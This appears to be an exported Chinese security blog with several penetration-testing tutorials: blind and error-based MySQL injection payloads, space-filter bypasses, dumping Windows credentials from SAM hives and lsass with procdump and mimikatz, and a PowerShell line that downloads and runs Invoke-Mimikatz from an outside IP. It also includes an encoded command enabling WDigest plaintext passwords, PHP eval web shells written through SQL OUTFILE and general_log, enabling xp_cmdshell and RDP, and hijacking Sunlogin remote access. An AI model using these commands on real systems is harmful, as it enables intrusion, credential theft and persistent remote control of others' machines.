<h3 id="IFNULL-："><a href="#IFNULL-：" class="headerlink" title="IFNULL()："></a>IFNULL()：</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql&gt; select username from user where id=1 and ifnull(1/(ascii(substr((select database()),1,1))&gt;1),sleep(1));</span><br><span class="line">+<span class="comment">----------+</span></span><br><span class="line">| username |</span><br><span class="line">+<span class="comment">----------+</span></span><br><span class="line">| testdemo |</span><br><span class="line">+<span class="comment">----------+</span></span><br><span class="line">1 row in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="keyword">select</span> username <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> <span class="keyword">ifnull</span>(<span class="number">1</span>/(<span class="keyword">ascii</span>(<span class="keyword">substr</span>((<span class="keyword">select</span> <span class="keyword">database</span>()),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">128</span>),<span class="keyword">sleep</span>(<span class="number">1</span>));</span><br><span class="line">Empty <span class="keyword">set</span> (<span class="number">1.00</span> sec)</span><br></pre></td></tr></table></figure>
<h3 id="case-when-expr1-then-expr2-else-expr3-end：-1"><a href="#case-when-expr1-then-expr2-else-expr3-end：-1" class="headerlink" title="case when expr1 then expr2 else expr3 end："></a>case when expr1 then expr2 else expr3 end：</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql&gt; select username from user where id=1 and (select case when ascii(substr((select database()),1,1))&gt;1 then 1 else sleep(1) end);</span><br><span class="line">+<span class="comment">----------+</span></span><br><span class="line">| username |</span><br><span class="line">+<span class="comment">----------+</span></span><br><span class="line">| testdemo |</span><br><span class="line">+<span class="comment">----------+</span></span><br><span class="line">1 row in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="keyword">select</span> username <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="keyword">case</span> <span class="keyword">when</span> <span class="keyword">ascii</span>(<span class="keyword">substr</span>((<span class="keyword">select</span> <span class="keyword">database</span>()),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">128</span> <span class="keyword">then</span> <span class="number">1</span> <span class="keyword">else</span> <span class="keyword">sleep</span>(<span class="number">1</span>) <span class="keyword">end</span>);</span><br><span class="line">Empty <span class="keyword">set</span> (<span class="number">1.00</span> sec)</span><br></pre></td></tr></table></figure>
<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><h3 id="updatexml-："><a href="#updatexml-：" class="headerlink" title="updatexml()："></a>updatexml()：</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql&gt; select username from user where 1=1 and updatexml(1,concat(0x7e,(select database())),1);</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#x27;~test&#x27;</span><br></pre></td></tr></table></figure>
<h3 id="extractvalue-："><a href="#extractvalue-：" class="headerlink" title="extractvalue()："></a>extractvalue()：</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql&gt; select username from user where 1=1 and extractvalue(1,concat(0x7e,(select database())));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#x27;~test&#x27;</span><br></pre></td></tr></table></figure>
<h3 id="floor-："><a href="#floor-：" class="headerlink" title="floor()："></a>floor()：</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql&gt; select username from user where 1=1 and (select 1 from (select count(*),concat((select database()),floor(rand(0)*2))x from mysql.user group by x)a);</span><br><span class="line">ERROR 1062 (23000): Duplicate entry &#x27;test1&#x27; for key &#x27;group_key&#x27;</span><br></pre></td></tr></table></figure>
<h3 id="name-const-：比较鸡肋"><a href="#name-const-：比较鸡肋" class="headerlink" title="name_const()：比较鸡肋"></a>name_const()：比较鸡肋</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql&gt; select username from user where 1=1 and (select * from (select name_const(version(),1),name_const(version(),1))a);</span><br><span class="line">ERROR 1060 (42S21): Duplicate column name &#x27;5.5.53&#x27;</span><br></pre></td></tr></table></figure>
<h3 id="exp-：对于版本限制比较大"><a href="#exp-：对于版本限制比较大" class="headerlink" title="exp()：对于版本限制比较大"></a>exp()：对于版本限制比较大</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql&gt; select exp(~(select * from(select user())x));</span><br><span class="line">ERROR 1690 (22003): DOUBLE value is out of range in &#x27;exp(~((<span class="keyword">select</span> <span class="string">&#x27;root@localhost&#x27;</span> <span class="keyword">from</span> dual)))<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
<h2 id="在不知道列名的情况下注入"><a href="#在不知道列名的情况下注入" class="headerlink" title="在不知道列名的情况下注入"></a>在不知道列名的情况下注入</h2><h3 id="正常查询。字段名为id，username，password"><a href="#正常查询。字段名为id，username，password" class="headerlink" title="正常查询。字段名为id，username，password"></a>正常查询。字段名为id，username，password</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql&gt; select * from user;</span><br><span class="line">+<span class="comment">----+-----------+----------------------------------+</span></span><br><span class="line">| id | username  | password                         |</span><br><span class="line">+<span class="comment">----+-----------+----------------------------------+</span></span><br><span class="line">|  1 | testdemo  | e10adc3949ba59abbe56e057f20f883e |</span><br><span class="line">|  2 | testdemo2 | e10adc3949ba59abbe56e057f20f883e |</span><br><span class="line">|  3 | testdemo3 | e10adc3949ba59abbe56e057f20f883e |</span><br><span class="line">+<span class="comment">----+-----------+----------------------------------+</span></span><br><span class="line">3 rows in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>
<h3 id="联合查询，字段名变为1，2，3"><a href="#联合查询，字段名变为1，2，3" class="headerlink" title="联合查询，字段名变为1，2，3"></a>联合查询，字段名变为1，2，3</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql&gt; select 1,2,3 union select * from user;</span><br><span class="line">+<span class="comment">---+-----------+----------------------------------+</span></span><br><span class="line">| 1 | 2         | 3                                |</span><br><span class="line">+<span class="comment">---+-----------+----------------------------------+</span></span><br><span class="line">| 1 | 2         | 3                                |</span><br><span class="line">| 1 | testdemo  | e10adc3949ba59abbe56e057f20f883e |</span><br><span class="line">| 2 | testdemo2 | e10adc3949ba59abbe56e057f20f883e |</span><br><span class="line">| 3 | testdemo3 | e10adc3949ba59abbe56e057f20f883e |</span><br><span class="line">+<span class="comment">---+-----------+----------------------------------+</span></span><br><span class="line">4 rows in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>
<h3 id="畸形查询："><a href="#畸形查询：" class="headerlink" title="畸形查询："></a>畸形查询：</h3><h4 id="姿势1："><a href="#姿势1：" class="headerlink" title="姿势1："></a>姿势1：</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql&gt; select `1`,`2`,`3` from (select 1,2,3 union select * from user)x limit 1,3;</span><br><span class="line">+<span class="comment">---+-----------+----------------------------------+</span></span><br><span class="line">| 1 | 2         | 3                                |</span><br><span class="line">+<span class="comment">---+-----------+----------------------------------+</span></span><br><span class="line">| 1 | testdemo  | e10adc3949ba59abbe56e057f20f883e |</span><br><span class="line">| 2 | testdemo2 | e10adc3949ba59abbe56e057f20f883e |</span><br><span class="line">| 3 | testdemo3 | e10adc3949ba59abbe56e057f20f883e |</span><br><span class="line">+<span class="comment">---+-----------+----------------------------------+</span></span><br><span class="line">3 rows in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>
<h4 id="姿势2："><a href="#姿势2：" class="headerlink" title="姿势2："></a>姿势2：</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql&gt; select * from (select 1)a,(select 2)b,(select 3)c union select * from user;</span><br><span class="line">+<span class="comment">---+-----------+----------------------------------+</span></span><br><span class="line">| 1 | 2         | 3                                |</span><br><span class="line">+<span class="comment">---+-----------+----------------------------------+</span></span><br><span class="line">| 1 | 2         | 3                                |</span><br><span class="line">| 1 | testdemo  | e10adc3949ba59abbe56e057f20f883e |</span><br><span class="line">| 2 | testdemo2 | e10adc3949ba59abbe56e057f20f883e |</span><br><span class="line">| 3 | testdemo3 | e10adc3949ba59abbe56e057f20f883e |</span><br><span class="line">+<span class="comment">---+-----------+----------------------------------+</span></span><br><span class="line">4 rows in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>
<h4 id="姿势3："><a href="#姿势3：" class="headerlink" title="姿势3："></a>姿势3：</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql&gt; select `1`,`2`,`3` from (select * from (select 1)a,(select 2)b,(select 3)c union select * from user)x limit 1,3;</span><br><span class="line">+<span class="comment">---+-----------+----------------------------------+</span></span><br><span class="line">| 1 | 2         | 3                                |</span><br><span class="line">+<span class="comment">---+-----------+----------------------------------+</span></span><br><span class="line">| 1 | testdemo  | e10adc3949ba59abbe56e057f20f883e |</span><br><span class="line">| 2 | testdemo2 | e10adc3949ba59abbe56e057f20f883e |</span><br><span class="line">| 3 | testdemo3 | e10adc3949ba59abbe56e057f20f883e |</span><br><span class="line">+<span class="comment">---+-----------+----------------------------------+</span></span><br><span class="line">3 rows in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>
<h4 id="姿势4："><a href="#姿势4：" class="headerlink" title="姿势4："></a>姿势4：</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql&gt; select * from (select * from (select 1)a join (select 2)b join (select 3)c union select * from user)x limit 3 offset 1;</span><br><span class="line">+<span class="comment">---+-----------+----------------------------------+</span></span><br><span class="line">| 1 | 2         | 3                                |</span><br><span class="line">+<span class="comment">---+-----------+----------------------------------+</span></span><br><span class="line">| 1 | testdemo  | e10adc3949ba59abbe56e057f20f883e |</span><br><span class="line">| 2 | testdemo2 | e10adc3949ba59abbe56e057f20f883e |</span><br><span class="line">| 3 | testdemo3 | e10adc3949ba59abbe56e057f20f883e |</span><br><span class="line">+<span class="comment">---+-----------+----------------------------------+</span></span><br><span class="line">3 rows in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>
<h2 id="空格复仇技巧"><a href="#空格复仇技巧" class="headerlink" title="空格复仇技巧"></a>空格复仇技巧</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span>(username)<span class="keyword">from</span>(<span class="keyword">user</span>);</span><br><span class="line"><span class="keyword">select</span><span class="string">`username`</span><span class="keyword">from</span><span class="string">`user`</span>;</span><br><span class="line"><span class="comment">/*!select*/</span>username<span class="comment">/**/</span>from<span class="comment">/*!12345user*/</span>;</span><br><span class="line"><span class="keyword">select</span>&#123;x username&#125;<span class="keyword">from</span>&#123;x <span class="keyword">user</span>&#125;;</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">version</span><span class="comment">/**/</span>();</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">version</span>%<span class="number">0</span>A();</span><br><span class="line"><span class="keyword">select</span> <span class="string">`version`</span>();</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> mysql<span class="comment">/**/</span>.<span class="comment">/**/</span><span class="keyword">user</span>;</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> <span class="string">`mysql`</span>.<span class="string">`user`</span>;</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> mysql%<span class="number">0</span>A.%<span class="number">0</span>Auser;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Web渗透</category>
      </categories>
      <tags>
        <tag>MYSQL</tag>
      </tags>
  </entry>
  <entry>
    <title>内存中获取管理员明文密码</title>
    <url>/posts/a8076874.html</url>
    <content><![CDATA[<h1 id="内存中获取管理员明文密码"><a href="#内存中获取管理员明文密码" class="headerlink" title="内存中获取管理员明文密码"></a>内存中获取管理员明文密码</h1><h2 id="注册表导出hash解密"><a href="#注册表导出hash解密" class="headerlink" title="注册表导出hash解密"></a>注册表导出hash解密</h2><p>导出<code>sam.hiv</code>文件：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">reg save hklm\sam C:\wwwroot\sam.hiv</span><br></pre></td></tr></table></figure>
<p><img src="https://qiniu.hzktester.top/tp2020112533.png" alt="image.png"><br>导出<code>sys.hiv</code>文件：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">reg save hklm\system C:\wwwroot\sys.hiv</span><br></pre></td></tr></table></figure>
<p><img src="https://qiniu.hzktester.top/tp2020112534.png" alt="image.png"><br>下载这两个文件，放到<code>mimikatz</code>目录中：<br><img src="https://qiniu.hzktester.top/tp2020112535.png" alt="image.png"><br><img src="https://qiniu.hzktester.top/tp2020112536.png" alt="image.png"><br>双击启动<code>mimikatz.exe</code>文件：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">log</span>		//生成日志文件</span><br><span class="line">lsadump::sam /sam:Sam.hiv /system:Sys.hiv	//抓取密码</span><br></pre></td></tr></table></figure>
<p><img src="https://qiniu.hzktester.top/tp2020112537.png" alt="image.png"><br>使用以下解码平台解密<code>NTLM</code>：</p>
<ul>
<li><a href="https://www.cmd5.com/">https://www.cmd5.com/</a></li>
<li><a href="https://www.objectif-securite.ch/ophcrack">https://www.objectif-securite.ch/ophcrack</a></li>
</ul>
<p>由于我的密码是强密码，所有没有解密出来：<br><img src="https://qiniu.hzktester.top/tp2020112538.png" alt="image.png"><br>我用自己密码加密。可以看出，结果是正确的</p>
<h2 id="内存中获取明文"><a href="#内存中获取明文" class="headerlink" title="内存中获取明文"></a>内存中获取明文</h2><p>需要满足两个条件：</p>
<ul>
<li>用户登录过该系统</li>
<li>登陆后未被重启过<h3 id="可以从内存中获取明文密码："><a href="#可以从内存中获取明文密码：" class="headerlink" title="可以从内存中获取明文密码："></a>可以从内存中获取明文密码：</h3>使用命令<code>ver</code>查看版本：版本低于<code>6.3</code>的可以从内存中获取明文密码：<br><img src="https://qiniu.hzktester.top/tp2020112539.png" alt="image.png"><h4 id="procdump获取内存文件"><a href="#procdump获取内存文件" class="headerlink" title="procdump获取内存文件"></a>procdump获取内存文件</h4>上传<code>procdump</code>文件到目标服务器：<br>执行命令：<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:/wwwroot/procdumpx64.exe  -accepteula -ma lsass.exe C:/wwwroot/lsass.dmp</span><br></pre></td></tr></table></figure>
<img src="https://qiniu.hzktester.top/tp2020112540.png" alt="image.png"><br><img src="https://qiniu.hzktester.top/tp2020112541.png" alt="image.png"><br>下载<code>lsass.dmp</code>到<code>mimikatz</code>目录中：<br><img src="https://qiniu.hzktester.top/tp2020112542.png" alt="image.png"><br>执行以下命令：<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">log</span>	</span><br><span class="line">sekurlsa::minidump lsass.dmp</span><br><span class="line">sekurlsa::logonPasswords full</span><br></pre></td></tr></table></figure>
然后查看日志文件<code>mimikatz.log</code>：<br><img src="https://qiniu.hzktester.top/tp2020112543.png" alt="image.png"><br>可以看到已经拿到了明文密码<h4 id="任务管理器导出内存文件"><a href="#任务管理器导出内存文件" class="headerlink" title="任务管理器导出内存文件"></a>任务管理器导出内存文件</h4>从任务管理器中找到<code>lsass.exe</code>进程：</li>
</ul>
<p>右键-创建转储文件<br><img src="https://qiniu.hzktester.top/tp2020112544.png" alt="image.png"><br>拿到<code>lsass.DMP</code>文件后还是使用<code>mimiktz</code>的命令即可：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">log</span>	</span><br><span class="line">sekurlsa::minidump lsass.dmp</span><br><span class="line">sekurlsa::logonPasswords full</span><br></pre></td></tr></table></figure>
<h4 id="Powershell-mimikatz"><a href="#Powershell-mimikatz" class="headerlink" title="Powershell+mimikatz"></a>Powershell+mimikatz</h4><p>上传<code>Invoke-Mimikatz.ps1</code>到目标服务器<br><img src="https://qiniu.hzktester.top/tp2020112545.png" alt="image.png"><br>使用以下命令直接获取明文密码：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">powershell <span class="string">&quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;http://139.155.236.39/Invoke-Mimikatz.ps1&#x27;); Invoke-Mimikatz&quot;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://qiniu.hzktester.top/tp2020112546.png" alt="image.png"><br>明文密码在这儿：<br><img src="https://qiniu.hzktester.top/tp2020112547.png" alt="image.png"></p>
<h4 id="Mimikatz直接读取"><a href="#Mimikatz直接读取" class="headerlink" title="Mimikatz直接读取"></a>Mimikatz直接读取</h4><p>上传<code>mimikatz_x64</code>文件到目标服务器上：<br><img src="https://qiniu.hzktester.top/tp2020112548.png" alt="image.png"><br>直接运行即可得到明文密码：<br><img src="https://qiniu.hzktester.top/tp2020112549.png" alt="image.png"></p>
<h3 id="无法从内存中获取明文密码"><a href="#无法从内存中获取明文密码" class="headerlink" title="无法从内存中获取明文密码"></a>无法从内存中获取明文密码</h3><h4 id="修改注册表"><a href="#修改注册表" class="headerlink" title="修改注册表"></a>修改注册表</h4><p>执行以下命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Powershell -ENC dAByAHkAIAB7ACAATgBlAHcALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgAC0AUABhAHQAaAAgAEgASwBMAE0AOgBcAFMAWQBTAFQARQBNAFwAQwB1AHIAcgBlAG4AdABDAG8AbgB0AHIAbwBsAFMAZQB0AFwAQwBvAG4AdAByAG8AbABcAFMAZQBjAHUAcgBpAHQAeQBQAHIAbwB2AGkAZABlAHIAcwBcAFcARABpAGcAZQBzAHQAIAAtAE4AYQBtAGUAIABVAHMAZQBMAG8AZwBvAG4AQwByAGUAZABlAG4AdABpAGEAbAAgAC0AVAB5AHAAZQAgAEQAVwBPAFIARAAgAC0AVgBhAGwAdQBlACAAMQAgAC0ARQByAHIAbwByAEEAYwB0AGkAbwBuACAAUwB0AG8AcAAgAH0AYwBhAHQAYwBoACAAewAgAH0A</span><br></pre></td></tr></table></figure>
<p><img src="https://qiniu.hzktester.top/tp2020112550.png" alt="image.png"><br>重启服务器后使用以上操作就可以在内存中获取明文密码了</p>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>提权</tag>
      </tags>
  </entry>
  <entry>
    <title>getshell后启动远程连接</title>
    <url>/posts/5413ca70.html</url>
    <content><![CDATA[<h1 id="getshell后启动远程连接"><a href="#getshell后启动远程连接" class="headerlink" title="getshell后启动远程连接"></a>getshell后启动远程连接</h1><h1 id="查询服务器远程连接："><a href="#查询服务器远程连接：" class="headerlink" title="查询服务器远程连接："></a>查询服务器远程连接：</h1><h2 id="进程查询："><a href="#进程查询：" class="headerlink" title="进程查询："></a>进程查询：</h2><p>查询进程服务名称为<code>TermService</code>的进行<code>PID</code>号：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tasklist /svc</span><br></pre></td></tr></table></figure>
<p><img src="https://qiniu.hzktester.top/tp2020112529.png" alt="image.png"><br>查询<code>PID</code>号对应开启的端口号：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netstat -ano | find <span class="string">&quot;1744&quot;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://qiniu.hzktester.top/tp2020112530.png" alt="image.png"></p>
<h2 id="注册表查询："><a href="#注册表查询：" class="headerlink" title="注册表查询："></a>注册表查询：</h2><p>通过以下命令查询注册表：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">reg query <span class="string">&quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot;</span> /v <span class="string">&quot;PortNumber&quot;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://qiniu.hzktester.top/tp2020112531.png" alt="image.png"><br>使用系统计算器解码：<br><img src="https://qiniu.hzktester.top/tp2020112532.png" alt="image.png"></p>
<h2 id="服务器未开始远程连接："><a href="#服务器未开始远程连接：" class="headerlink" title="服务器未开始远程连接："></a>服务器未开始远程连接：</h2><p>开启远程连接命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="string">&quot; &quot;</span>Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br></pre></td></tr></table></figure>
<p>关闭远程连接命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="string">&quot; &quot;</span>Server /v fDenyTSConnections /t REG_DWORD /d 11111111 /f</span><br></pre></td></tr></table></figure>


]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>提权</tag>
      </tags>
  </entry>
  <entry>
    <title>phpmyadmin，sqlserver，向日葵提权.md</title>
    <url>/posts/89382ca7.html</url>
    <content><![CDATA[<h1 id="phpmyadmin提权"><a href="#phpmyadmin提权" class="headerlink" title="phpmyadmin提权"></a>phpmyadmin提权</h1><h2 id="SQL语句写getshell"><a href="#SQL语句写getshell" class="headerlink" title="SQL语句写getshell"></a>SQL语句写getshell</h2><h3 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h3><ul>
<li>已知<code>web</code>应用绝对路径。</li>
<li><code>mysql</code>配置文件中<code>secure_file_priv</code>的值为空。</li>
</ul>
<h3 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h3><p>设置<code>secure_file_priv</code>的值为空：<br><img src="https://qiniu.hzktester.top/tp2020112515.png" alt="image"><br>重启配置生效：<br><img src="https://qiniu.hzktester.top/tp2020112516.png" alt="image"></p>
<h4 id="查看是否具有写入权限："><a href="#查看是否具有写入权限：" class="headerlink" title="查看是否具有写入权限："></a>查看是否具有写入权限：</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">global</span> <span class="keyword">variables</span> <span class="keyword">like</span> <span class="string">&#x27;%secure%&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p><img src="https://qiniu.hzktester.top/tp2020112517.png" alt="image"></p>
<ul>
<li><code>secure_file_priv</code>为<code>null</code>表示不允许导入导出；</li>
<li><code>secure_file_priv</code>指定文件夹时，表示mysql的导入导出只能在指定的文件夹；</li>
<li><code>secure_file_priv</code>没有设置时，则表示没有任何限制；</li>
</ul>
<h4 id="查web绝对路径"><a href="#查web绝对路径" class="headerlink" title="查web绝对路径"></a>查<code>web</code>绝对路径</h4><ul>
<li>利用mysql的特性<code>select @@basedir</code><br><img src="https://qiniu.hzktester.top/tp2020112518.png" alt="image"><br>这里很明显是用了宝塔集成环境，那么默认路径是<code>C:/wwwroot</code></li>
<li><code>phpinfo</code>信息泄露<br><img src="https://qiniu.hzktester.top/tp2020112519.png" alt="image"></li>
<li>通过报错</li>
</ul>
<h4 id="写入一句话木马："><a href="#写入一句话木马：" class="headerlink" title="写入一句话木马："></a>写入一句话木马：</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">&#x27;&lt;?php @eval($_POST[cmd]);?&gt;&#x27;</span><span class="keyword">INTO</span> <span class="keyword">OUTFILE</span> <span class="string">&#x27;C://wwwroot//shell.php&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p><img src="https://qiniu.hzktester.top/tp2020112520.png" alt="image"><br>使用蚁剑连接<br><img src="https://qiniu.hzktester.top/tp2020112521.png" alt="image"></p>
<h2 id="日志变量getshell"><a href="#日志变量getshell" class="headerlink" title="日志变量getshell"></a>日志变量getshell</h2><ol>
<li>开启日志保存并修改保存位置<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SET</span> <span class="keyword">global</span> general_log = <span class="string">&quot;ON&quot;</span>;</span><br><span class="line"><span class="keyword">SET</span> <span class="keyword">global</span> general_log_file=<span class="string">&#x27;C://wwwroot//shell2.php&#x27;</span>; </span><br></pre></td></tr></table></figure></li>
<li>我们在<code>SQL</code>查询的框中写入<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">&quot;&lt;?php eval($_POST[&#x27;cmd&#x27;]);?&gt;&quot;</span>;</span><br></pre></td></tr></table></figure></li>
<li>蚁剑连接<br><img src="https://qiniu.hzktester.top/tp2020112522.png" alt="image"></li>
</ol>
<h1 id="SQL-server提权"><a href="#SQL-server提权" class="headerlink" title="SQL server提权"></a>SQL server提权</h1><p>开启<code>xp_cmdshell</code>：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">sp_configure &#x27;<span class="keyword">show</span> <span class="keyword">advanced</span> options<span class="string">&#x27;,1</span></span><br><span class="line"><span class="string">reconfigure</span></span><br><span class="line"><span class="string">go</span></span><br><span class="line"><span class="string">sp_configure &#x27;</span>xp_cmdshell<span class="string">&#x27;,1</span></span><br><span class="line"><span class="string">reconfigure</span></span><br><span class="line"><span class="string">go</span></span><br></pre></td></tr></table></figure>
<p><img src="https://qiniu.hzktester.top/tp2020112523.png" alt="image"><br>执行系统命令：<br><img src="https://qiniu.hzktester.top/tp2020112524.png" alt="image"></p>
<h1 id="向日葵远程连接提权："><a href="#向日葵远程连接提权：" class="headerlink" title="向日葵远程连接提权："></a>向日葵远程连接提权：</h1><p>如果目标机器安装了向日葵：<br>默认位置：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:/Program Files/Oray/SunLogin/SunloginClient</span><br></pre></td></tr></table></figure>
<p>我们在自己电脑上同样安装一个向日葵，修改自己的配置文件改为他的配置文件：<br><img src="https://qiniu.hzktester.top/tp2020112525.png" alt="image"><br>这时，连接密码就一样了：<br><img src="https://qiniu.hzktester.top/tp2020112526.png" alt="image"><br>识别码在这里：<br><img src="https://qiniu.hzktester.top/tp2020112527.png" alt="image"><br>然后就远程连接了他的电脑：<br><img src="https://qiniu.hzktester.top/tp2020112528.png" alt="image"></p>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>提权</tag>
      </tags>
  </entry>
  <entry>
    <title>中间件降权，宝塔偷梁换柱提权</title>
    <url>/posts/7ab30567.html</url>
    <content><![CDATA[<h1 id="windwos用户-用户组"><a href="#windwos用户-用户组" class="headerlink" title="windwos用户/用户组"></a>windwos用户/用户组</h1><h2 id="net-user：用户操作"><a href="#net-user：用户操作" class="headerlink" title="net user：用户操作"></a>net user：用户操作</h2><p>以下以操作用户名<code>test</code>为例</p>
<ul>
<li><code>net user test 密码 /add</code>：添加用户</li>
<li><code>net user test 密码</code>：修改用户名密码</li>
<li><code>net user test</code>：查看<code>test</code>用户详情</li>
<li><code>net user test /active:yes</code>：激活<code>test</code>用户</li>
<li><code>net user test /active:no</code>：禁用<code>test</code>用户</li>
</ul>
<h2 id="net-localgroup：用户组操作"><a href="#net-localgroup：用户组操作" class="headerlink" title="net localgroup：用户组操作"></a>net localgroup：用户组操作</h2><ul>
<li><code>net localgroup Administrators</code>：查询<code>Administrators</code>用户组成员</li>
<li><code>net localgroup Administrators test /add</code>：添加<code>test</code>到<code>Administrators</code>用户组</li>
<li><code>net localgroup Administrators test /del</code>：从<code>Administrators</code>用户组删除<code>test</code></li>
</ul>
<h1 id="默认可写目录"><a href="#默认可写目录" class="headerlink" title="默认可写目录"></a>默认可写目录</h1><ul>
<li>windows：<code>C:/Windows/Temp</code></li>
<li>linux：<code>/tmp</code></li>
</ul>
<h1 id="宝塔中间件降权"><a href="#宝塔中间件降权" class="headerlink" title="宝塔中间件降权"></a>宝塔中间件降权</h1><h2 id="Apache使用www用户运行"><a href="#Apache使用www用户运行" class="headerlink" title="Apache使用www用户运行"></a>Apache使用www用户运行</h2><p><img src="https://qiniu.hzktester.top/tp2020112501.png" alt="image.png"></p>
<h2 id="Mysql使用mysql用户运行"><a href="#Mysql使用mysql用户运行" class="headerlink" title="Mysql使用mysql用户运行"></a>Mysql使用mysql用户运行</h2><p><img src="https://qiniu.hzktester.top/tp2020112502.png" alt="image.png"></p>
<h1 id="getshell之后登录宝塔"><a href="#getshell之后登录宝塔" class="headerlink" title="getshell之后登录宝塔"></a>getshell之后登录宝塔</h1><h2 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h2><p>需要管理员权限<br><img src="https://qiniu.hzktester.top/tp2020112503.png" alt="image.png"></p>
<h2 id="查看宝塔面板登录入口"><a href="#查看宝塔面板登录入口" class="headerlink" title="查看宝塔面板登录入口"></a>查看宝塔面板登录入口</h2><p>默认存储位置：<code>C:/BtSoft/panel/data/admin_path.pl</code><br><img src="https://qiniu.hzktester.top/tp2020112504.png" alt="image.png"><br><img src="https://qiniu.hzktester.top/tp2020112505.png" alt="image.png"></p>
